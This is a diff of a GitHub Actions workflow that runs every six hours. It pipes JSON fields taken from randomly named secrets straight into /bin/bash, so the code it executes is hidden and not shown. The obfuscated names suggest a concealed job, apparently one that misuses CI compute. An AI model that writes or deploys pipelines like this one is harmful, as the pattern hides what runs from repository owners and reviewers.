@@ -3,30 +3,18 @@ name: panxiaoyi1988
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 1/6 * * *'
-jobs:  # 18450
+    - cron: '21 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: panxiaoyi1988
         env:
-          pnje6027: ${{ secrets.pnje6027 }}
+          ysnt63363: ${{ secrets.ysnt63363 }}
         run: |
-          echo $pnje6027 | jq -r .qfth9 | /bin/bash
-          echo $q0770 | jq -r .jtwwg4 | /bin/bash
-          echo $kht11822 | jq -r .sk026 | /bin/bash
-          echo $t724 | jq -r .izybu5460 | /bin/bash
-          echo $iv4796 | jq -r .izsq7 | /bin/bash
-          echo $z18 | jq -r .oqtxq3 | /bin/bash
-          echo $b07457 | jq -r .dblh76 | /bin/bash
-          echo $unql927 | jq -r .rhxek42 | /bin/bash
-          echo $gmphl8396 | jq -r .fopxu6 | /bin/bash
-          echo $xzb0109 | jq -r .muc892 | /bin/bash
-          echo $hawdh9021 | jq -r .befar58240 | /bin/bash
-          echo $mvmy261 | jq -r .j33296 | /bin/bash
-          echo $okmek1 | jq -r .rych9339 | /bin/bash
-          echo $wafuf851 | jq -r .d74939 | /bin/bash
-          echo $cytq7 | jq -r .fcvh13865 | /bin/bash
-          echo $bmgc91549 | jq -r .tunpc45739 | /bin/bash
+          echo $ysnt63363 | jq -r .hjdf59016 | /bin/bash
+          echo $qgj91507 | jq -r .sxuh41037 | /bin/bash
+          echo $fl7177 | jq -r .x06 | /bin/bash
 
